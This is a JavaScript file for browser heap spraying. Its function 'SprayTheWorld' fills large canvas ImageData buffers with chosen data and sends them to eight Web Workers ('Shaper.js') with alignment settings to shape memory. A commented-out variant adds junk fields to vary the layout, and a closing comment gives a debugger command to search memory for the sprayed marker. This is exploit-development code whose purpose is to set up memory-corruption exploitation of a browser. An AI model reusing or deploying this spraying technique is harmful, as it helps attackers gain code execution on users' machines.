var HEAP_BLOCK_SIZE = (0x100000 * 4);// == malloc(0x100000 * 4);
var WORKERS_COUNT = 0x8;

var gMemory = Array();

function SprayTheWorld(data, alignment, skippedBytes)
{
	var canvas = document.createElement("canvas");
	var context = canvas.getContext("2d");
	var img = context.createImageData(1, HEAP_BLOCK_SIZE);
			
	for (var i = 0; i < data.length; i++)
		img.data[i] = data[i] + 1;//mark this used memory!

	for (var i = 0; i < WORKERS_COUNT; i++)
	{
		var shaper = new Worker("Shaper.js");

		shaper.onerror = function(e)
		{
			alert("shaper error!");
		}

		shaper.onmessage = function(e)
		{
			memory = e.data;
			gMemory.push(memory);
			
			if (gMemory.length == WORKERS_COUNT)
				alert("spray done, check memory");
		}
/*
		switch (i % 6)
		{
			case 0:
				shaper.postMessage( { "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
				break;
			case 1:
				shaper.postMessage( { "trash" : true, "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
				break;
			case 2:
				shaper.postMessage( { "trash" : true, "trash1" : true, "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
				break;
			case 3:
				shaper.postMessage( { "trash" : true, "trash1" : true, "trash2" : true, "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
				break;
			case 4:
				shaper.postMessage( { "trash" : true, "trash1" : true, "trash2" : true, "trash3" : true, "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
				break;
			case 5:
				shaper.postMessage( { "trash" : true, "trash1" : true, "trash2" : true, "trash3" : true, "trash4" : true, "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
				break;
		}
		
		//spray memory
		//*/shaper.postMessage( { "img" : img, "alig" : (1 << (4 * alignment)) - 1, "data" : data, "skipped" : skippedBytes } );
	}
}

//s -d 0x00000000 L?0xFFFFFFFF 0x70616523
